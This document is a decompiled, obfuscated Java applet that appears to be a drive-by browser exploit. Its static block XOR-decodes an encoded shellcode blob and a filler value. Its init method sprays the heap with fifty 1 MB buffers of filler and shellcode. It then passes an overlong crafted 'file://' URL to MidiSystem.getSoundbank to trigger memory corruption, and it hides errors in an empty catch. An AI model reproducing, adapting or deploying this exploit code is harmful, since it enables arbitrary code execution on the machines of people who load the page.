import java.nio.IntBuffer;
import java.util.regex.Pattern;
import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class vmain extends Applet
{
    public static boolean z;
    public static boolean A;
    private static final String[] B;
    
    public void init() {
        final String s = vmain.B[2];
        try {
            this.a(c(s), c(a(vmain.B[1], 4)));
            MidiSystem.getSoundbank(new URL(vmain.B[5] + a(vmain.B[3], 151) + vmain.B[4]));
        }
        catch (Exception ex) {}
    }
    
    public static byte[] a(String d) {
        d = d(d);
        final byte[] array = new byte[d.length() / 2];
        for (int i = 0; i < d.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(d.charAt(i), 16) << 4) + Character.digit(d.charAt(i + 1), 16));
        }
        return array;
    }
    
    public static String b(String d) {
        d = d(d);
        String string = new String();
        for (int i = 0; i < d.length(); i += 2) {
            string += (char)((Character.digit(d.charAt(i), 16) << 4) + Character.digit(d.charAt(i + 1), 16));
        }
        return string;
    }
    
    public static short[] c(String d) {
        d = d(d);
        final short[] array = new short[d.length() / 2];
        for (int i = 0; i < d.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(d.charAt(i), 16) & 0xFF) << 4) + (Character.digit(d.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public static String d(final String s) {
        return Pattern.compile(vmain.B[0]).matcher(s).replaceAll("");
    }
    
    public static String a(final String s, final int n) {
        String string = new String();
        for (int i = 0; i < n; ++i) {
            string += s;
        }
        return string;
    }
    
    public final IntBuffer[] a(final short[] array, final short[] array2) {
        final boolean a = vmain.A;
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        int i = 0;
    Label_0115_Outer:
        while (i < n) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            int j = 0;
            while (true) {
                while (j < n3) {
                    allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
                    ++j;
                    if (a) {
                        while (true) {
                            while (j < array.length) {
                                allocate.put(array[j++] | array[j++] << 8 | array[j++] << 16 | array[j++] << 24);
                                if (!a) {
                                    if (a) {
                                        break;
                                    }
                                    continue Label_0115_Outer;
                                }
                                else {
                                    if (a) {
                                        break Label_0115_Outer;
                                    }
                                    continue Label_0115_Outer;
                                }
                            }
                            array3[i] = allocate;
                            ++i;
                            continue;
                        }
                    }
                    if (a) {
                        vmain.z = !vmain.z;
                        break;
                    }
                }
                j = 0;
                continue;
            }
        }
        return array3;
    }
    
    static {
        final String[] b = new String[6];
        final int n = 0;
        final char[] charArray = "1wz\u001f\"".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0098: {
                if (n2 > 1) {
                    break Label_0098;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = 'j';
                            break;
                        }
                        case 1: {
                            c2 = '0';
                            break;
                        }
                        case 2: {
                            c2 = 'W';
                            break;
                        }
                        case 3: {
                            c2 = 'E';
                            break;
                        }
                        default: {
                            c2 = '\u007f';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        b[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "S\u0000".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0214: {
                if (n6 > 1) {
                    break Label_0214;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = 'j';
                            break;
                        }
                        case 1: {
                            c4 = '0';
                            break;
                        }
                        case 2: {
                            c4 = 'W';
                            break;
                        }
                        case 3: {
                            c4 = 'E';
                            break;
                        }
                        default: {
                            c4 = '\u007f';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 > n8) {
                continue;
            }
            break;
        }
        b[n5] = new String(charArray2).intern();
        final int n9 = 2;
        final char[] charArray3 = "X\t\u0014|;Ss\u0014\u0001/Sa`qM^v\u001aq=:\u0001d}J+r\u0012\u001c:\\\u0004\u0012\u0010:+vb\fL[\u0007et5]wgvHX\u0001`}L/`\u0016\u00149)\u0000c\u0007=[\u0006f\u0001K[\u0004c\r:]t\u001e\u0000L[s\u0014uM/vav4+q\u0019qH8\u0004\u0004w=Yz\u0015}O+ga\u0003LRe\u0012\u0006=/ucq<Y\t\u0015uK.v\u0016t9,vc\u0000<!rn\u0003JY\b\u0014q>_s\u0016\u0000<[q\u0014p;\\\u0001f\u000fK+d\u0013\u001fF+\t\u0014\u00014]v\u0018\u0003HYu\u0016\u0011K+u\u0011\u000f9Zq\u0012pIZu\u0013\fH+\u0004\u0012rI\"\b\u000fpM]qnv<%\u0002b\u0001&+`\u0015\bO)\u0005\u0004|N-\u0005bvM\\\u0000b}I\\\u0002\u0012\u0014=_\u0006\u0011\u0004(Xtou++so}7+vc\u0002O,t`tF/j\u0016\u0006&_\u0001c\u0006(Xu\u0007w-[qo}G;\bn\u0001>3t\u0011\r:XunsH/\u0007du&S\u0003\u0015vI>\u0002\u0000\u0004JY\u0003dr;2\u0004g\u0012;)xb|KR~e\u0006I)\tb\fN)df}([s\u0013sKZ\u0006\u0000\u0007>/q\u0012\u0001>S~a\u0001H(rb};+\te\fH\\t\u0016\u0006:R\b\u0013\u000b<Ztf\u0000=\\q\u0015\u0012<]\u0007ar6S\b\u0016|5Z\u0001\u0018w7+v`w')\bg\u001fJZr\u0012\u000bM-v\u0002|>_qntK<\u0007\u0016\u0007;[\u0007\u0007\u0000N0v\u0002vK9\u0003gv+(\u007f\u0012\u00179'\u0007\u0011t.S\u0006\u0016rG0tn\u0006=Xu\u0012\nJ.q\u0006wN\\s\u000ftO_ho\u0006O%\u0000\u0013\u0000H^\u0000\u0016tORqd\u0006H2\u0005nsN(s\u0016\n;_b\u0013\u0001I(t\u0012qLYq\u0010\u0007MS\u0007e\b>.\u0006\u0015\u00066X\u0000\u0012\u0011JS\u0001\u0003\u0006MRsf}:(td\u001cI\\\u0005\u0016vN8\u0003\u0016|6,\u0000d\u0016H^\u0003bsF_td\u0010=2\u0004\u001e\u0000=[ra|>_\u0000\u0015\u0004(Y`\u0012r+/\b".toCharArray();
        int length3;
        int n11;
        final int n10 = n11 = (length3 = charArray3.length);
        int n12 = 0;
        while (true) {
            Label_0330: {
                if (n10 > 1) {
                    break Label_0330;
                }
                length3 = (n11 = n12);
                do {
                    final char c5 = charArray3[n11];
                    char c6 = '\0';
                    switch (n12 % 5) {
                        case 0: {
                            c6 = 'j';
                            break;
                        }
                        case 1: {
                            c6 = '0';
                            break;
                        }
                        case 2: {
                            c6 = 'W';
                            break;
                        }
                        case 3: {
                            c6 = 'E';
                            break;
                        }
                        default: {
                            c6 = '\u007f';
                            break;
                        }
                    }
                    charArray3[length3] = (char)(c5 ^ c6);
                    ++n12;
                } while (n10 == 0);
            }
            if (n10 > n12) {
                continue;
            }
            break;
        }
        b[n9] = new String(charArray3).intern();
        final int n13 = 3;
        final char[] charArray4 = "E\u001f".toCharArray();
        int length4;
        int n15;
        final int n14 = n15 = (length4 = charArray4.length);
        int n16 = 0;
        while (true) {
            Label_0446: {
                if (n14 > 1) {
                    break Label_0446;
                }
                length4 = (n15 = n16);
                do {
                    final char c7 = charArray4[n15];
                    char c8 = '\0';
                    switch (n16 % 5) {
                        case 0: {
                            c8 = 'j';
                            break;
                        }
                        case 1: {
                            c8 = '0';
                            break;
                        }
                        case 2: {
                            c8 = 'W';
                            break;
                        }
                        case 3: {
                            c8 = 'E';
                            break;
                        }
                        default: {
                            c8 = '\u007f';
                            break;
                        }
                    }
                    charArray4[length4] = (char)(c7 ^ c8);
                    ++n16;
                } while (n14 == 0);
            }
            if (n14 > n16) {
                continue;
            }
            break;
        }
        b[n13] = new String(charArray4).intern();
        final int n17 = 4;
        final char[] charArray5 = "N\u0014sa[N\u0014sa[N\u0014".toCharArray();
        int length5;
        int n19;
        final int n18 = n19 = (length5 = charArray5.length);
        int n20 = 0;
        while (true) {
            Label_0562: {
                if (n18 > 1) {
                    break Label_0562;
                }
                length5 = (n19 = n20);
                do {
                    final char c9 = charArray5[n19];
                    char c10 = '\0';
                    switch (n20 % 5) {
                        case 0: {
                            c10 = 'j';
                            break;
                        }
                        case 1: {
                            c10 = '0';
                            break;
                        }
                        case 2: {
                            c10 = 'W';
                            break;
                        }
                        case 3: {
                            c10 = 'E';
                            break;
                        }
                        default: {
                            c10 = '\u007f';
                            break;
                        }
                    }
                    charArray5[length5] = (char)(c9 ^ c10);
                    ++n20;
                } while (n18 == 0);
            }
            if (n18 > n20) {
                continue;
            }
            break;
        }
        b[n17] = new String(charArray5).intern();
        final int n21 = 5;
        final char[] charArray6 = "\fY; EE\u001f".toCharArray();
        int length6;
        int n23;
        final int n22 = n23 = (length6 = charArray6.length);
        int n24 = 0;
        while (true) {
            Label_0678: {
                if (n22 > 1) {
                    break Label_0678;
                }
                length6 = (n23 = n24);
                do {
                    final char c11 = charArray6[n23];
                    char c12 = '\0';
                    switch (n24 % 5) {
                        case 0: {
                            c12 = 'j';
                            break;
                        }
                        case 1: {
                            c12 = '0';
                            break;
                        }
                        case 2: {
                            c12 = 'W';
                            break;
                        }
                        case 3: {
                            c12 = 'E';
                            break;
                        }
                        default: {
                            c12 = '\u007f';
                            break;
                        }
                    }
                    charArray6[length6] = (char)(c11 ^ c12);
                    ++n24;
                } while (n22 == 0);
            }
            if (n22 <= n24) {
                b[n21] = new String(charArray6).intern();
                B = b;
                return;
            }
            continue;
        }
    }
}
